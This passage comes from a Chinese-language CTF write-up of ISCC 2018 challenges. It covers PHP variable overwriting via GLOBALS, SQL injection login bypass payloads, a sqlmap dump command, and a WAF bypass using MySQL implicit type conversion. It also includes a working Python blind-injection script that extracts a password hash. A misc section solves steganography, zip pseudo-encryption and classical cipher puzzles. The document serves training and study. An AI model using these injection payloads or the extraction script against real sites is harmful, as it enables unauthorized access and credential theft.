4469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p><strong>输入用户名和以上其中一个字符串作为密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/JCfL3mdhGc.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/m8Ab2Ia83m.png?imageslim" alt="mark"><br><strong>进入第二关，代码如下</strong></p><pre><code>NULL &lt;?phpinclude &apos;flag.php&apos;;$a = @$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; </code></pre><p><strong>可以看出存在变量覆盖漏洞，利用全局变量’$GLOBALS’覆盖</strong></p><pre><code>http://118.190.152.202:8005/no_md5.php?a=GLOBALS</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2ID3G0Jjck.png?imageslim" alt="mark"></p><pre><code>flag:ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4}</code></pre><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p><strong>题目直接说明这是一道注入，打开后是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BKJ21D2858.png?imageslim" alt="mark"><br><strong>测试一下是否存在注入</strong></p><p><strong>输入</strong></p><pre><code>username=&apos; or 1=1 and 1=1#password=123456</code></pre><p><strong>会直接登陆成功并将我们输入的username:<code>&#39; or 1=1 and 1=1#</code>输出出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/lbHB1lK397.png?imageslim" alt="mark"><br><strong>输入</strong></p><pre><code>username=&apos; or 1=2 and 1=1#password=123456</code></pre><p><strong>则会显示输入的用户名或密码错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9h4A03j9b8.png?imageslim" alt="mark"><br><strong>由此可以判断<code>username</code>参数可能存在注入。大概的登陆验证过程：将输入的username与password拼接成sql查询语句带入数据库查询，如果查到结果便会登陆成功并显示输入的用户名，查询不到结果就会返回用户名或密码错误的提示</strong></p><p><strong>可以看出该处是一个很普通的盲注，可以写脚本也可以直接用sqlmap，这里为了尽快拿到一血直接上sqlmap</strong></p><pre><code>sqlmap.py -r &quot;C:\Users\I&apos;m possible\Desktop\post.txt&quot; -p username --dump -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; -T &quot;news&quot; -D &quot;sqli_database&quot;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G4J8lce8IE.png?imageslim" alt="mark"></p><pre><code>flag{hahaha999999999}</code></pre><h2 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h2><p><strong>HINT：我都过滤了，看你怎么绕。记住是mysql</strong></p><p><strong>打开后看到是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5b9D0GfAGf.png?imageslim" alt="mark"><br><strong>结合题目提示猜测是去绕WAF注入，首先测试了一下，发现当用户名正确而密码错误时会返回<code>password error</code>，当用户名错误时会返回<code>username error的错误</code>，于是猜测可能存在盲注。</strong></p><p><strong>测试了一下，发现大概过滤了以下关键字</strong></p><pre><code>#、,、union、--+、and、or、|、%26（&amp;的url编码）</code></pre><p><strong>简单来说，就是不能使用and，or等关键字进行逻辑判断去盲注，同样不能使用注释符去注释后面的语句。谷歌了一下<a href="https://www.anquanke.com/post/id/85936" title="相关的资料" target="_blank" rel="external">相关的资料</a>，发现这种情况可以利用mysql的<a href="http://www.freebuf.com/articles/web/8773.html" title="隐式类型转换" target="_blank" rel="external">隐式类型转换</a>去绕过，类似于php的弱类型。所谓的隐式类型转换，简单来说，就是对mysql的字符类型进行一些加、减、取余等数字操作运算时，又或者是将字符类型与数字类型进行比较时，会将字符类型转为数字类型，比如</strong></p><pre><code>mysql&gt; select &apos;45abcd&apos;-&apos;abc&apos;;+----------------+| &apos;45abcd&apos;-&apos;abc&apos; |+----------------+|             45 |+----------------+1 row in set, 2 warnings (0.02 sec)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/66FADIfl31.png?imageslim" alt="mark"><br><strong>在这里将字符串<code>45abcd</code>转为了数字<code>45</code>,将字符串<code>abc</code>转为了数字<code>0</code></strong><br><strong>于是可以得出不是以数字开头的字符串在进行隐式类型转换时都会转为数字0</strong><br><strong>再看</strong></p><pre><code>mysql&gt; select &apos;aaa&apos;=0;+---------+| &apos;aaa&apos;=0 |+---------+|       1 |+---------+1 row in set, 1 warning (0.00 sec)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/59e6GD26C4.png?imageslim" alt="mark"><br><strong>在这里将字符串aaa与数字0进行比较时将字符串aaa转为了数字0</strong></p><p><strong>再看以下语句</strong></p><pre><code>mysql&gt; select * from users where username=0;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/77f80m2hGC.png?imageslim" alt="mark"><br><strong>可以看到<code>where username=0</code>时会将数据表中所有数据类型查出来，因为username在数据库中的存储类型为varchar类型，也就是字符串类型，在进行比较时会将这些字符串类型全转为数字类型，所以不以数字开头的字符串都会被转成0，从而查询出所有结果</strong></p><p><strong>再看</strong></p><pre><code>mysql&gt; select * from users where username=&apos;&apos;-0-&apos;&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i6k7I0cFFe.png?imageslim" alt="mark"><br><strong>可以看出当<code>where username=&#39;&#39;-0-&#39;&#39;</code>时会进行隐式类型转换，运算结果相当于<code>where username=0</code>,会返回所有结果</strong></p><p><strong>如果将中间的0变为1，相当于<code>where username=-1</code>,由于数据库里没有以-1开头的字符串，就会返回空</strong></p><pre><code>mysql&gt; select * from users where username=&apos;&apos;-1-&apos;&apos;;Empty set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LhKhC37728.png?imageslim" alt="mark"><br><strong>由此可以看出我们是可以在中间这个位置进行逻辑判断去盲注的</strong></p><p><strong>知道了这些后来返回题目看这道题，构造payload</strong></p><pre><code>uname=&apos;-0-&apos;&amp;passwd=123456</code></pre><p><strong>这里用户名有查询结果，所以会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E7FLDcFlBk.png?imageslim" alt="mark"><br><strong>构造payload</strong></p><pre><code>uname=&apos;-1-&apos;&amp;passwd=123456</code></pre><p><strong>而这里用户名没有查询结果，所以会返回<code>username error</code>的错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5Adfbcg230.png?imageslim" alt="mark"><br><strong>按照这个思路，可以进行逻辑判断进行盲注，构造payload猜出数据库中passwd字段的长度</strong></p><pre><code>uname=&apos;-(length(passwd)=passwd的长度)-&apos;&amp;passwd=123456</code></pre><p><strong>当<code>(length(passwd)=passwd的长度)</code>为真时结果为1，也就是查不出用户名，会返回<code>username error</code>，为假时结果为0，会返回查询结果但是密码错误，也就会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/ebgKLjl969.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6800eBgjbK.png?imageslim" alt="mark"><br><strong>通过这种方式可以判断出用户表中有一个长度为32字节的passwd字段</strong></p><p><strong>同样的可以通过这种方式判断出passwd字段中的值，用python写一个脚本即可，贴出我的代码</strong></p><pre><code>import requestsurl=&quot;http://118.190.152.202:8019/login.php&quot;passwd=&quot;&quot;for i in range(1,33):    for j in range(1,256):        data={            &apos;uname&apos;:&quot;&apos;-(ascii(mid((passwd)from(%d)))=%d)-&apos;&quot;%(i,j),            &apos;passwd&apos;:&apos;admin&apos;        }        html=requests.post(url,data=data).content        if &quot;username error!!&quot; in html:            passwd=passwd+chr(j)            print passwd            break</code></pre><p><strong>为了更好的理解脚本，可以看看以下我测试时写的查询语句</strong></p><pre><code>mysql&gt; select mid((password)from(1)) from users;+------------------------+| mid((password)from(1)) |+------------------------+| Dumb                   || I-kill-you             || p@ssword               || crappy                 || stupidity              || genious                || mob!le                 || admin                  || admin1                 || admin2                 || admin3                 || dumbo                  || admin4                 |+------------------------+13 rows in set (0.00 sec)    mysql&gt; select mid((password)from(2)) from users;+------------------------+| mid((password)from(2)) |+------------------------+| umb                    || -kill-you              || @ssword                || rappy                  || tupidity               || enious                 || ob!le                  || dmin                   || dmin1                  || dmin2                  || dmin3                  || umbo                   || dmin4                  |+------------------------+13 rows in set (0.00 sec)    mysql&gt; select ascii(mid((password)from(1))) from users;+-------------------------------+| ascii(mid((password)from(1))) |+-------------------------------+|                            68 ||                            73 ||                           112 ||                            99 ||                           115 ||                           103 ||                           109 ||                            97 ||                            97 ||                            97 ||                            97 ||                           100 ||                            97 |+-------------------------------+13 rows in set (0.00 sec)    mysql&gt; select ascii(mid((password)from(2))) from users;+-------------------------------+| ascii(mid((password)from(2))) |+-------------------------------+|                           117 ||                            45 ||                            64 ||                           114 ||                           116 ||                           101 ||                           111 ||                           100 ||                           100 ||                           100 ||                           100 ||                           117 ||                           100 |+-------------------------------+13 rows in set (0.00 sec)    mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=117)-&apos;b&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 14 | admin4   | admin4     |+----+----------+------------+11 rows in set, 26 warnings (0.00 sec)    mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=118)-&apos;b&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set, 26 warnings (0.00 sec)    </code></pre><p><strong>最后跑出密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6F8e68Ha50.png?imageslim" alt="mark"></p><pre><code>0416af0a8accf2be556a8e131438b814</code></pre><p><strong>MD5在线解密一下，通过密码可以看出出题人素质并不怎么高</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/hik351lm3b.png?imageslim" alt="mark"></p><pre><code>nishishabi1438</code></pre><p><strong>用户名<code>admin</code>，密码<code>nishishabi1438</code>，登陆成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/J8h7d48C81.png?imageslim" alt="mark"><br><strong>后台并没有flag，看提示应该是命名执行，但是试了好多命令都没有回显，最后偶然输入了<code>flag</code>，结果flag就出来了。。。ctm</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/I87lF5ffkG.png?imageslim" alt="mark"></p><pre><code>flag{sql_iNjEct_Is_Easy} </code></pre><h2 id="Misc方向"><a href="#Misc方向" class="headerlink" title="Misc方向"></a>Misc方向</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p><strong>HINT：Where is the FLAG？</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/h28Le5LE80.png?imageslim" alt="mark"><br><strong>下载下来发现是一个图片，图片中一个手指向下指，图片名为WhatIsThat，于是猜测下面有一部分因为高度的问题没有显示出来，查看图片属性中的分辨率</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/FH2K6mE9JG.png?imageslim" alt="mark"><br><strong>将500转为16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j6a0iCgBai.png?imageslim" alt="mark"><br><strong>用winhex16进制编辑工具打开，查找500的16进制，修改图片的高度，看看能不能将图片的下面显示出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/5eJmBcdcd7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/E5HjlBi8fd.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j73lkBK07e.png?imageslim" alt="mark"><br><strong>可以看到flag已经出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/9896a394g8.png?imageslim" alt="mark"><br><code>Flag={_Welcome_To_ISCC_2018_}</code></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p><strong>HINT:知识就是力量</strong></p><pre><code>秘密电报：知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</code></pre><p><strong>混过密码吧的我明显看出是培根密码，该密码有两种密码表，第一次选密码表选错了，直接写python解密</strong></p><pre><code>e=(&quot;ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA&quot;).lower()d={&apos;aaaaa&apos;:&apos;A&apos;,&apos;aaaab&apos;:&apos;B&apos;,&apos;aaaba&apos;:&apos;C&apos;,&apos;aaabb&apos;:&apos;D&apos;,&apos;aabaa&apos;:&apos;E&apos;,&apos;aabab&apos;:&apos;F&apos;,&apos;aabba&apos;:&apos;G&apos;,&apos;aabbb&apos;:&apos;H&apos;,&apos;abaaa&apos;:&apos;I&apos;,&apos;abaab&apos;:&apos;J&apos;,&apos;ababa&apos;:&apos;K&apos;,&apos;ababb&apos;:&apos;L&apos;,&apos;abbaa&apos;:&apos;M&apos;,&apos;abbab&apos;:&apos;N&apos;,&apos;abbba&apos;:&apos;O&apos;,&apos;abbbb&apos;:&apos;P&apos;,&apos;baaaa&apos;:&apos;Q&apos;,&apos;baaab&apos;:&apos;R&apos;,&apos;baaba&apos;:&apos;S&apos;,&apos;baabb&apos;:&apos;T&apos;,&apos;babaa&apos;:&apos;U&apos;,&apos;babab&apos;:&apos;V&apos;,&apos;babba&apos;:&apos;W&apos;,&apos;babbb&apos;:&apos;X&apos;,&apos;bbaaa&apos;:&apos;Y&apos;,&apos;bbaab&apos;:&apos;Z&apos;}for i in range(0,len(e)/5):    a=e[5*i:5*i+5]    for j in d.keys():        if a==j:            print d[j]            break#另一个密码表#&apos;AAAAA&apos;:&apos;a&apos;,#&apos;AAAAB&apos;:&apos;b&apos;,#&apos;AAABA&apos;:&apos;c&apos;,#&apos;AAABB&apos;:&apos;d&apos;,#&apos;AABAA&apos;:&apos;e&apos;,#&apos;AABAB&apos;:&apos;f&apos;,#&apos;AABBA&apos;:&apos;g&apos;,#&apos;AABBB&apos;:&apos;h&apos;,#&apos;ABAAA&apos;:&apos;i&apos;,#&apos;ABAAA&apos;:&apos;j&apos;,#&apos;ABAAB&apos;:&apos;k&apos;,#&apos;ABABA&apos;:&apos;l&apos;,#&apos;ABABB&apos;:&apos;m&apos;,#&apos;ABBAA&apos;:&apos;n&apos;,#&apos;ABBAB&apos;:&apos;o&apos;,#&apos;ABBBA&apos;:&apos;p&apos;,#&apos;ABBBB&apos;:&apos;q&apos;,#&apos;BAAAA&apos;:&apos;r&apos;,#&apos;BAAAB&apos;:&apos;s&apos;,#&apos;BAABA&apos;:&apos;t&apos;,#&apos;BAABB&apos;:&apos;u&apos;,#&apos;BAABB&apos;:&apos;v&apos;,#&apos;BABAA&apos;:&apos;w&apos;,#&apos;BABAB&apos;:&apos;x&apos;,#&apos;BABBA&apos;:&apos;y&apos;,#&apos;BABBB&apos;:&apos;z&apos;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/72h93k8km6.png?imageslim" alt="mark"><br><strong>也可以直接在线解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/KeaecDEf7k.png?imageslim" alt="mark"><br><code>flag:ILIKEISCC</code></p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p><strong>HINT：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</strong><br><strong>下载下来后是个看似加密过的zip压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gEGGkIb3jm.png?imageslim" alt="mark"><br><strong>但是题目名就是说的暴力破解不可取，于是首先想到的就是zip伪加密，对于zip伪加密，首先要了解zip文件的16进制格式，winhex打开我们下载的压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/k7Jbg0fAgC.png?imageslim" alt="mark"><br><strong>下面来说一下压缩包的16进制文件格式</strong></p><pre><code>一个zip文件由三部分组成，压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志压缩源文件数据区： 50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 00 00：扩展记录长度压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50) 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 07 08：全局方式位标记（有无加密，这个更改这里进行伪加密，第二个加密位如果为奇数，打开就会提示有密码了，在这里第二个加密位为07，所以确实是伪加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度 00 00：磁盘开始号 00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量压缩源文件目录结束标志： 50 4B 05 06：目录结束标记 00 00：当前磁盘编号 00 00：目录区开始磁盘编号 01 00：本磁盘上纪录总数 01 00：目录区中纪录总数 5A 00 00 00：目录区尺寸大小 37 00 00 00：目录区对第一张磁盘的偏移量 00 00：ZIP 文件注释长度</code></pre><p><strong>通过介绍可以看出这里的压缩文件确实存在伪加密，由于压缩源文件目录区的全局方式标记位标记的第二个加密位控制着压缩文件是否为伪加密，为奇数时就为伪加密，为偶数时正常，所以我们将这一位改为08保存，再次打开就不会显示加密了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/8ilhjlJ5cj.png?imageslim" alt="mark"><br><strong>可以看到flag文件里的内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/kDheF0j5J6.png?imageslim" alt="mark"><br><strong>但是提交不成功，猜想此处做了加密，想到凯撒加密的套路，写python脚本解密一下吧</strong></p><pre><code>s=&quot;vfppjrnerpbzvat&quot;for i in range(0,27):    for j in range(0,len(s)):        s=s[:j]+chr(97+(ord(s[j:j+1])-97+1)%26)+s[j+1:]    print s</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gd6D8Bhd3C.png?imageslim" alt="mark"><br><strong>找到一个规则的字符串，恩恩，就<code>isccwearecoming</code>吧</strong></p><p><code>flag:isccwearecoming</code></p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p><strong>HINT：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h1KfgBKi00.png?imageslim" alt="mark"></p><pre><code>Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</code></pre><p><strong>可以看到及似一串base64编码，<a href="http://www1.tc711.com/tool/BASE64.htm" title="base64在线解码" target="_blank" rel="external">base64在线解码</a>一下</strong></p><p><strong>直到不能解码为止，发现是一个类似AES加密的密文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2IkK0dA8d1.png?imageslim" alt="mark"></p><pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc%3D</code></pre><p><strong>处理一下</strong></p><pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=</code></pre><p><strong>之后<a href="http://tool.oschina.net/encrypt" title="AES在线解密" target="_blank" rel="external">AES在线解密</a>一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/k7Hhm7g8hh.png?imageslim" alt="mark"><br><strong>发现解密出来的东西很像是一个名为<code>与佛论禅</code>的加密</strong></p><pre><code>缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</code></pre><p><strong>拿到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" title="与佛论禅" target="_blank" rel="external">与佛论禅</a>的网站解密一下，注意解密方法</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/mlHB71g3Db.png?imageslim" alt="mark"><br><strong>所以这道题的flag就是</strong></p><pre><code>把我复制走</code></pre><p><strong>南无阿弥陀佛~</strong></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p><strong>HINT:这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</strong></p><p><strong>可以看出这像是一串16进制编码，解码一下即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/5bFI9F3Fg6.png?imageslim" alt="mark"></p><pre><code>flag:it&apos;s easy!</code></pre><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/BhhBab5h33.png?imageslim" alt="mark"><br><strong>用winhex查看一下，发现有字符区域WPS字样，猜测图片里隐藏了word文档，因为word文档（doc、xls）的文件头16进制为<code>D0CF11E0</code>，于是尝试查找16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/6Kddage3bb.png?imageslim" alt="mark"><br><strong>可以看出在<code>D0CF11E0</code>在<code>FFD9</code>尾部（jpg的文件尾16进制为FFD9），所以图片里确实藏有doc文档，位置还是在jpg图片的尾部</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j22G2BG4aB.png?imageslim" alt="mark"><br><strong>知道了这些后，接下来用winhex将doc文档从图片中分离出来，选中属于word文件的16进制区域，右键，Edit-&gt;Copy Block-&gt;Into New Flie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/kfe41m3IIi.png?imageslim" alt="mark"><br><strong>用WPS打开noname文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/8eJd74J1J8.png?imageslim" alt="mark"><br><strong>可以看出内容又是一串经过<code>与佛论禅</code>加密后的密文，去与佛论禅网站在线解密一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/i9L72dDc0K.png?imageslim" alt="mark"><br><strong>解密出如下内容</strong></p><pre><codecode></pre><p><strong>可以看到是一串类似16进制的编码，16进制解码后得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bFh7k8HJ5B.png?imageslim" alt="mark"></p><pre><code>R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF</code></pre><p><strong>再进行base64解码得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/cLef2ge7I5.png?imageslim" 